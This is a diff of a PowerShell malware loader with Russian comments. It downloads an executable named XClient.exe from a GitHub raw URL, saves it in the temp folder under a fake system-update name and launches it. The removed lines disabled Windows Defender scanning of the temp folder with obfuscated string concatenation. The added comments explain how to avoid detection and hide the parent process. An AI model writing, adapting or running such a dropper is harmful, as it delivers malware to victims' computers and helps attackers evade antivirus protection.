@@ -1,17 +1,9 @@
-# Обфусцированный вызов исключения
-$p = "Ex"+"clusion"+"Path"
-$cmd = "Add-Mp"+"Preference"
-$t = $env:TEMP
-
-# Выполняем добавление в исключения через склейку
-& $cmd -$p $t
-
-# Качаем билд (ссылку тоже можно подклеить)
+# loader.ps1
 $u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
-$o = "$t\sys_check_update.exe"
+$p = "$env:TEMP\sys_update.exe"
 
-$wc = New-Object Net.WebClient
-$wc.DownloadFile($u, $o)
+# Используем системный метод загрузки, который реже палится
+(New-Object System.Net.WebClient).DownloadFile($u, $p)
 
-# Запуск
-Start-Process $o
+# Запуск через cmd, чтобы разорвать связь с процессом PowerShell
+cmd /c start /b $p
